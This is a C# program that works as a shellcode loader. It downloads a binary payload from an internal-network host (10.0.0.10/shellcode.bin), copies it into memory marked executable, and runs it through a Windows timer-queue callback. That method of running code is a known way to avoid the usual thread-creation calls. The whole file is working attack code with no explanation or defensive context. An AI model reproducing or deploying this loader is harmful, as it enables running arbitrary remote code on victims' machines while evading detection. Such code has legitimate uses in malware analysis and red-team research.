using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CreateTimerQueueTimer
{
    class Program
    {
        static void Main()
        {
            string url = "http://10.0.0.10/shellcode.bin";
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            IntPtr addr = VirtualAlloc(IntPtr.Zero, shellcode.Length, 0x1000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            IntPtr timer;
            IntPtr queue = CreateTimerQueue();
            IntPtr gDoneEvent = CreateEvent(IntPtr.Zero, true, false, null);

            if (!CreateTimerQueueTimer(out timer, queue, addr, IntPtr.Zero, 100, 0, 0))
            {
                Console.WriteLine("CreateTimerQueueTimer failed with error {0}", GetLastError());
            }
            else
            {
                WaitForSingleObject(gDoneEvent, 0xFFFFFFFF);
            }

            CloseHandle(gDoneEvent);
            DeleteTimerQueueEx(queue, IntPtr.Zero);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateEvent(IntPtr lpEventAttributes, bool bManualReset, bool bInitialState, string lpName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateTimerQueue();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateTimerQueueTimer(out IntPtr phNewTimer, IntPtr TimerQueue, IntPtr Callback, IntPtr Parameter, uint DueTime, uint Period, uint Flags);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint GetLastError();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DeleteTimerQueueEx(IntPtr TimerQueue, IntPtr CompletionEvent);
    }
}
